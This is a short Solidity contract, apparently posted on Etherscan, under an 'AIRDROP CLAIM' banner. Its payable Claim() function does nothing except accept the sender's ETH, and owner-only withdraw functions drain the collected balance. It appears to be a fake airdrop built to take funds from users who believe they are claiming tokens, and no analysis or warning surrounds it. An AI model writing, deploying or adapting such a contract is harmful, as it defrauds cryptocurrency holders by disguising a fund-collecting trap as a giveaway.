/**
 *Submitted for verification at Etherscan.io on 2023-06-10
*/

/**
 █████╗ ██╗██████╗ ██████╗ ██████╗  ██████╗ ██████╗      ██████╗██╗      █████╗ ██╗███╗   ███╗    
██╔══██╗██║██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝██║     ██╔══██╗██║████╗ ████║    
███████║██║██████╔╝██║  ██║██████╔╝██║   ██║██████╔╝    ██║     ██║     ███████║██║██╔████╔██║    
██╔══██║██║██╔══██╗██║  ██║██╔══██╗██║   ██║██╔═══╝     ██║     ██║     ██╔══██║██║██║╚██╔╝██║    
██║  ██║██║██║  ██║██████╔╝██║  ██║╚██████╔╝██║         ╚██████╗███████╗██║  ██║██║██║ ╚═╝ ██║    
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝          ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝    
                                                                                                  
*/

pragma solidity ^0.4.26;

contract ContractMint {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
   
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        // Underscore is a special character only used inside
        // a function modifier and it tells Solidity to
        // execute the rest of the code.
        _;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
    
    function withdrawto(uint256 amount, address recipient) public onlyOwner{
        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
        require(recipient != address(0), "Recipient address cannot be the zero address.");
        recipient.transfer(amount);

    }

    function Claim() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}